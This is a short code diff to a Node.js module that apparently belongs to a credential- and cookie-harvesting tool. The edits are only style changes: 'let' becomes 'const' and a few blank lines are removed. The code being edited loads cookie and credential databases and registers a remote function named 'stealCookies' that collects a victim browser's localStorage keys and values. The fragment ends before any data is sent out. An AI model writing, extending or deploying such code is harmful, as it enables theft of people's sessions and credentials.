@@ -1,10 +1,10 @@
-let nosql = require("nosql");
+const nosql = require("nosql");
 
-let path = require("path");
-let util = require("util");
+const path = require("path");
+const util = require("util");
 
-let cookieDb = nosql.load(path.join(__dirname, "..", "cookieDb.nosql"));;
-let credDb = nosql.load(path.join(__dirname, "..", "credDb.nosql"));;
+const cookieDb = nosql.load(path.join(__dirname, "..", "cookieDb.nosql"));;
+const credDb = nosql.load(path.join(__dirname, "..", "credDb.nosql"));;
 
 module.exports = (M) => {
 
@@ -31,9 +31,7 @@ module.exports = (M) => {
 	})
 
 	M.addRemoteFunction("stealCookies", function (args, debug) {
-
 		let keys = Object.keys(localStorage);
-
 		let values = Object.values(localStorage);
 
 		let lS = {};
